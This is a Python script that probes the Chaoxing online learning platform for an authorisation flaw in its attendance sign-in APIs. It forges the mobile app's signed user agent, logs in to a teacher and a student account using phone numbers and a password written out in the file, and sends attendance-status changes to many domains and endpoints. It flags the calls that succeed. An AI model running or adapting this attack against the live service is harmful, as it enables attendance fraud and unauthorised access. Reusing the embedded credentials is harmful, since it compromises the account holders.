import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"
TEST_AID = "5000163767353"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = any(kw in detail.lower() for kw in ["success", "修改成功"]) or '"state":"success"' in evidence
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def run():
    print("=" * 80)
    print(f"多域名签到API探索")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    domains = [
        "https://mooc1-api.chaoxing.com",
        "https://mooc1.chaoxing.com",
        "https://fy.chaoxing.com",
        "https://i.chaoxing.com",
        "https://api.chaoxing.com",
        "https://app.chaoxing.com",
        "https://web.chaoxing.com",
        "https://learn.chaoxing.com",
    ]

    api_paths = [
        "/pptSign/updateSignStatusByUidsV2",
        "/pptSign/updateSignStatus",
        "/pptSign/updateSignStatusByUids",
        "/pptSign/stuSignajax",
        "/mooc-ans/pptSign/updateSignStatusByUidsV2",
        "/mooc-ans/pptSign/updateSignStatus",
        "/apis/pptSign/updateSignStatusByUidsV2",
        "/apis/pptSign/updateSignStatus",
    ]

    print("\n[2] 多域名API探测...")
    print("=" * 80)

    for domain in domains:
        print(f"\n--- 域名: {domain} ---")
        for path in api_paths:
            url = f"{domain}{path}"
            for session, label in [(s_s, "学生"), (s_t, "教师")]:
                try:
                    r = session.post(url,
                                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                                     data={"uids": STUDENT_PUID, "status": "2", "remark": "",
                                           "activeId": TEST_AID, "classId": CLASS_ID, "courseId": COURSE_ID,
                                           "uid": puid_s if label == "学生" else puid_t},
                                     headers={"Referer": f"{domain}/", "X-Requested-With": "XMLHttpRequest",
                                              "Content-Type": "application/x-www-form-urlencoded"},
                                     timeout=15, allow_redirects=False)
                    short_path = path.split("/")[-1][:25]
                    short_domain = domain.replace("https://", "").replace(".chaoxing.com", "")
                    rec(f"{short_domain}-{short_path}-{label}",
                        f"{label} POST {domain}{path}: HTTP {r.status_code}, {r.text[:100]}",
                        r.text[:300])
                except Exception as e:
                    short_path = path.split("/")[-1][:25]
                    short_domain = domain.replace("https://", "").replace(".chaoxing.com", "")
                    rec(f"{short_domain}-{short_path}-{label}",
                        f"{label} POST {domain}{path}: ERROR {str(e)[:80]}")

    print("\n" + "=" * 80)
    print("[3] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "multi_domain_sign_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    success = sum(1 for r in results if '"state":"success"' in r.get("evidence", ""))
    perm = sum(1 for r in results if "无权限" in r.get("detail", "") or "无权限" in r.get("evidence", ""))
    err500 = sum(1 for r in results if "500" in r.get("detail", ""))
    err404 = sum(1 for r in results if "404" in r.get("detail", ""))
    print(f"  成功: {success}, 无权限: {perm}, 500错误: {err500}, 404错误: {err404}")

if __name__ == "__main__":
    run()
